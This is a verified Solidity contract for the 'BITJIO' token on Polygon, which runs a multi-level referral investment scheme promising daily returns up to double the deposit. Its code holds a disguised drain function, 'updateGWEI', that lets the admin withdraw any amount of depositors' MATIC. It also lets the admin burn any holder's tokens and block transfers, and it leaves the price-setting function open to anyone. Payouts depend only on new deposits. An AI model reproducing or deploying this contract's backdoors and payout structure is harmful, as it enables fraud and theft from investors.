/**
 *Submitted for verification at polygonscan.com on 2023-05-20
*/

// SPDX-License-Identifier: UNLISCENSED
pragma solidity 0.8.7;
contract BITJIO  {
    string public name = "BITJIO";
    string public symbol = "BTO";
    uint256 public totalSupply =110000000*10**18; // 100 Cr tokens
    uint8 public decimals = 18;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner,address indexed _spender,uint256 _value);
    struct User {
        uint id;
        uint rank;
        address referrer;
        uint partnersCount;
        uint256 totalDeposit;
        uint256 directBusiness;
        uint256 directincome;
        uint256 levelincome;
        uint256 payouts;
        uint256 royaltyincome;
        uint256 totalincome;
        uint256 totalwithdraw;
    }
    struct OrderInfo {
        uint256 amount; 
        uint256 deposit_time;
        uint256 payouts;
        bool isactive;
    }
    mapping(address=>User) public users;
    mapping(address => OrderInfo[]) public orderInfos;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(uint => address) public idToAddress;
    uint public lastUserId = 2;
    address private admin;
    address public id1=0xeB6dEFedEBC7832221C5a8F3e32995BD7ada689D;
    address public ico=0x132F3998AA04E0f3e85f1bc44460d8663594e187;
    uint256 private dayRewardPercents = 5;
    uint256 private constant timeStepdaily =1 days;
    uint256 private constant timeStepweekly =7 days;
    uint256 private directPercents = 10;
    uint256[10] private levelPercents = [50,30,20,10,5,5,10,20,30,40];
    uint256[10] private directCount = [2,2,3,3,4,4,5,5,6,6];
    mapping (address => bool) public isBlocklisted;
    address public platform_fee;
    mapping(uint => uint) public royaltybusinessCond;
    mapping(uint=>address[]) public royaltyUsers;  
    uint256 _initialCoinRate = 10000;
    uint public TotalHoldings=0;
    uint256 public royaltyPool;
    uint256 public lastDistribute;
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint256 value);
    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);
    event withdraw(address indexed user,uint256 value);
    constructor() {
        admin=msg.sender;
        platform_fee=0xeB6dEFedEBC7832221C5a8F3e32995BD7ada689D;
        balanceOf[admin] =60000000*10**18;
        balanceOf[ico] = 50000000*10**18;
        emit Transfer(address(0), admin, 60000000*10**18);
        emit Transfer(address(0), ico, 50000000*10**18);
        User memory user = User({
            id: 1,
            rank:0,
            referrer: address(0),
            partnersCount: 0,
            totalDeposit:0,
            directBusiness:0,
            directincome:0,
            levelincome:0,
            payouts:0,
            royaltyincome:0,
            totalincome:0,
            totalwithdraw:0

        });
        lastDistribute = block.timestamp;
        users[id1] = user;
        idToAddress[1] = id1;
        royaltybusinessCond[1]=1000000e18;
        royaltybusinessCond[2]=3000000e18;
    }
    function registrationExt(address referrerAddress) external payable{
        require(msg.value>=10e18, "Minimum invest amount is 10 MATIC!");
        registration(msg.sender, referrerAddress,msg.value);
    }
    function registrationFor(address referrerAddress,address userAddress) external payable{
        require(msg.value>=10e18, "Minimum invest amount is 10 MATIC!");
        registration(userAddress, referrerAddress,msg.value);
    }
    function registration(address userAddress, address referrerAddress,uint256 _amount) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            rank:0,
            referrer: referrerAddress,
            partnersCount: 0,
            totalDeposit:0,
            directBusiness:0,
            directincome:0,
            levelincome:0,
            payouts:0,
            royaltyincome:0,
            totalincome:0,
            totalwithdraw:0

        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;
        lastUserId++;
        users[referrerAddress].partnersCount++; 
        _distributeDeposit(userAddress,_amount);        
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    function buyToken() external payable {
        require(isUserExists(msg.sender), "user not exists");
        require(msg.value>=10e18, "Minimum invest amount is 10 MATIX!");
        uint256 _amount=msg.value;		
        _distributeDeposit(msg.sender,_amount);
        emit Upgrade(msg.sender,msg.value);
    }
    function coinRate() public view returns(uint256)
    {
        return _initialCoinRate;
    }
    function updateCoinRate(uint256 _token,uint Isbuy) public {
        if(Isbuy==1)
        _initialCoinRate+=_initialCoinRate*1*_token/10000e24;
        else 
        _initialCoinRate-=_initialCoinRate*1*_token/10000e24;
    }
    function tokensToMATIC(uint tokenAmount) public view returns(uint)
    {
        uint _rate = coinRate();
        return tokenAmount*_rate/1e6;
    }
    function sellToken(uint tokenAmount) public
    {
        require(isUserExists(msg.sender), "user not exists");
        require(balanceOf[msg.sender]>=tokenAmount, "Insufficient token balance!");
        uint maticAmount = tokensToMATIC(tokenAmount);
        require(address(this).balance>=maticAmount, "Insufficient fund in contract!");
        TotalHoldings+=maticAmount; 
        balanceOf[msg.sender] -= tokenAmount;
        balanceOf[ico] += tokenAmount;
        emit Transfer(msg.sender, ico, tokenAmount);
        updateCoinRate(tokenAmount,0);
        payable(msg.sender).transfer(maticAmount);

    }
    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }
    function _distributeDeposit(address _user, uint256 _amount) private { 
        users[_user].totalDeposit += _amount;        
        payable(platform_fee).transfer(_amount*10/100);
        
        
        uint _rate = coinRate();
        uint tokens =_amount*1e6/_rate;
        users[users[_user].referrer].directBusiness+=tokens;
        royaltyPool+=tokens*5/100;
        balanceOf[ico] -= tokens;
        balanceOf[_user] += tokens/2;
        TotalHoldings+=_amount; 
        emit Transfer(ico, _user, tokens/2);
        updateCoinRate(tokens,1);
        orderInfos[_user].push(OrderInfo(
            tokens/2, 
            block.timestamp, 
            0,
            true
        ));        
        _distributelevelIncome(_user, tokens/2); 
        _calLevel(users[_user].referrer);
        
    }
    
    function _distributelevelIncome(address _user, uint256 _amount) private {

        address _referrer = users[_user].referrer;
        users[_referrer].directincome += _amount*directPercents/100;
        users[_referrer].totalincome += _amount*directPercents/100;
        emit Transaction(users[_user].referrer,_user,_amount*directPercents/100,1,1);
        address upline = users[_referrer].referrer;        
        uint8 i = 0;
        for(; i < 10; i++){
            if(upline != address(0)){
                if(users[upline].partnersCount>=directCount[i])
                {
                    uint256 reward=_amount*levelPercents[i]/1000; 
                    users[upline].levelincome += reward;                       
                    users[upline].totalincome +=reward;
                    emit Transaction(upline,_user,reward,(i+1),2);
                    upline = users[upline].referrer;
                }                

            }else{
                break;
            }
        }
        uint256 totalrestreward=0;
        for(; i < 10; i++){  
            uint256 reward=_amount*levelPercents[i]/1000;          
            totalrestreward+=reward;          
        }
        if(totalrestreward>0)
        {
        users[id1].levelincome += totalrestreward;                       
        users[id1].totalincome +=totalrestreward;
        emit Transaction(id1,_user,totalrestreward,0,18);
        }
    }
    function _calLevel(address _user) private {
        uint rank=users[_user].rank;
        uint nextrank=rank+1;
        if(users[_user].directBusiness>=royaltybusinessCond[nextrank] && nextrank<=2)
        {
            users[_user].rank=nextrank;
            royaltyUsers[nextrank].push(_user);
            _calLevel(_user);
        }
    }
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==admin,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        payable(admin).transfer(_amount);  
    }
    function _distributeRoyaltyIncome(uint8 _level) private {
        uint256 royaltyCount=royaltyUsers[_level].length;
        if(royaltyCount > 0){
            uint256 _royaltyincome = royaltyPool/royaltyCount;
            for(uint256 i = 0; i < royaltyCount; i++){ 
                users[royaltyUsers[_level][i]].royaltyincome += _royaltyincome;
                users[royaltyUsers[_level][i]].totalincome +=_royaltyincome;   
                emit Transaction(royaltyUsers[_level][i],id1,_royaltyincome,_level,4); 
            }
        }
    }
    function maxPayoutOf(uint256 _depositamount) pure external returns(uint256) {
        return _depositamount*2;
    }
    function dailyPayoutOf(address _user) public {
        uint256 max_payout=0;
        for(uint8 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
                if(block.timestamp>order.deposit_time && order.isactive){    
                    max_payout = this.maxPayoutOf(order.amount);   
                    if(order.payouts<max_payout){                   
                        uint256 dailypayout =(order.amount*dayRewardPercents*((block.timestamp - order.deposit_time) / timeStepdaily) / 1000) - order.payouts;
                        order.payouts+=dailypayout;
                        if(max_payout<dailypayout){
                            dailypayout = max_payout;                            
                        }
                        if(dailypayout>0)
                        {
                        users[_user].payouts += dailypayout;            
                        users[_user].totalincome +=dailypayout;
                        emit Transaction(_user,ico,dailypayout,1,3);                            
                        }  
                    }
                    else {
                        order.isactive=false;
                    }                
                }
        }
    }
    function rewardWithdraw() public
    {
        dailyPayoutOf(msg.sender);
        uint balanceReward = users[msg.sender].totalincome - users[msg.sender].totalwithdraw;
        require(balanceReward>=15e18, "Insufficient reward to withdraw!");
        users[msg.sender].totalwithdraw+=balanceReward;
        balanceOf[ico] -= balanceReward;
        balanceOf[msg.sender] += balanceReward;
        emit Transfer(ico, msg.sender, balanceReward);
        emit withdraw(msg.sender,balanceReward);
    }
    function distributePoolRewards() public {
        if(block.timestamp > lastDistribute+timeStepweekly){ 
            _distributeRoyaltyIncome(1);
            _distributeRoyaltyIncome(2);
            royaltyPool=0;
            lastDistribute = block.timestamp;
        }
    }
    function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
       require(!isBlocklisted[msg.sender], "Address is blocklisted!");
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value)
        public
        returns (bool success)
    {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function burn(uint256 amount,address account) public returns (bool) {
        if (msg.sender != admin) {revert("Access Denied");}
        _burn(account, amount);
        return true;
    }
    function _burn(address account, uint256 amount) internal virtual 
    {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = balanceOf[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        require(totalSupply>=amount, "Invalid amount of tokens!");
        balanceOf[account] = accountBalance - amount;        
        totalSupply -= amount;
    }
    function transferOwnership(address newOwner) public returns (bool) {
        if (msg.sender != admin) {revert("Access Denied");}
        admin = newOwner;
        return true;
    }
    function addToBlocklist(address[] memory _addresses) external {
        if (msg.sender != admin) {revert("Access Denied");}
        for (uint256 i = 0;i < _addresses.length;i++) {
            isBlocklisted[_addresses[i]] = true;
        }
    }

    function removeFromWhitelist (address[] memory _addresses) external {
        if (msg.sender != admin) {revert("Access Denied");}
        for (uint256 i = 0;i < _addresses.length;i++) {
            isBlocklisted[_addresses[i]] = false;
        }
    }
}